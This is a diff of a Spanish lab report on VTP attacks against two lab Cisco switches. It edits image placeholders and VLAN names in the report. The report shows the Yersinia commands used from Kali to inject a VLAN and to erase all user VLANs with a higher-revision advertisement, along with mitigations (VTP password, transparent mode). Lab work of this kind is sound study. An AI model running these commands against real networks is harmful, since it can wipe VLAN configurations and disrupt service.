@@ -33,6 +33,8 @@ Imagen 1
 
 ### SW1 — VTP Server
 
+IMAGEN 2
+
 - Dominio: ITLA  
 - VTP versión: 1  
 - Modo: Server  
@@ -41,6 +43,8 @@ Imagen 1
 - Puerto Et0/1: trunk 802.1q hacia SW2  
 
 ### SW2 — VTP Client
+
+IMAGEN 3
 
 - Dominio: ITLA  
 - VTP versión: 1  
@@ -92,9 +96,12 @@ sudo yersinia -I
 
 Dentro de Yersinia: F2 → VTP mode → a → agregar VLAN
 
+IMAGEN 4
+IMAGEN 5
+
 ### Estado después del ataque
 
-![Imagen 7 - VLAN 80 ITLA agregada por el ataque](imagen7_vlan_agregada.png)
+IMAGEN 6
 
 ```
 SW1# show vlan brief
@@ -111,16 +118,8 @@ VLAN  Name     Status
 ### Objetivo
 Eliminar todas las VLANs definidas por el usuario en SW1 y SW2 enviando un anuncio VTP con número de revisión superior y base de datos vacía.
 
-### Estado antes del ataque
 
-![Imagen 2 - Estado SW1 antes del ataque](imagen2_sw1_antes.png)
 
-```
-SW1# show vlan brief
-VLAN  Name       Status
-1     default    active
-10    HOLA       active
-```
 
 ### Ejecución del ataque desde Kali
 
@@ -128,15 +127,10 @@ VLAN  Name       Status
 sudo yersinia vtp -attack 1 -interface eth0
 ```
 
-![Imagen 3 - Yersinia capturando tráfico VTP](imagen3_yersinia_captura.png)
-
-![Imagen 4 - Ejecución del ataque borrar VLANs](imagen4_ataque_borrar.png)
+IMAGEN 7
+IMAGEN 8
 
 ### Estado después del ataque
-
-![Imagen 5 - SW1 después del ataque - VLANs borradas](imagen5_sw1_despues.png)
-
-![Imagen 6 - SW2 después del ataque - VLANs borradas](imagen6_sw2_despues.png)
 
 ```
 SW1# show vtp status
@@ -145,10 +139,10 @@ Configuration Revision : 10
 SW1# show vlan brief
 VLAN  Name     Status
 1     default  active
-← VLAN 10 "HOLA" eliminada ✓
+← VLAN 80 "ITLA" eliminada ✓
 ```
 
-**Resultado:** El ataque fue exitoso. La revisión subió a 10 y la VLAN 10 fue eliminada en SW1 y SW2.
+**Resultado:** El ataque fue exitoso. La revisión subió a 10 y la VLAN 80 fue eliminada en SW1 y SW2.
 
 ---
 
@@ -169,7 +163,7 @@ SW1# show vtp password
 VTP Password: cisco
 ```
 
-![Imagen 8 - Configuración VTP password en SW1](imagen8_vtp_password.png)
+IMAGEN 9
 
 ### Efecto
 ```
@@ -196,7 +190,7 @@ SW1(config)# vtp mode transparent
 Setting device to VTP Transparent mode for VLANS.
 ```
 
-![Imagen 9 - Configuración VTP mode transparent](imagen9_vtp_transparent.png)
+IMAGEN 10
 
 ### Efecto
 ```
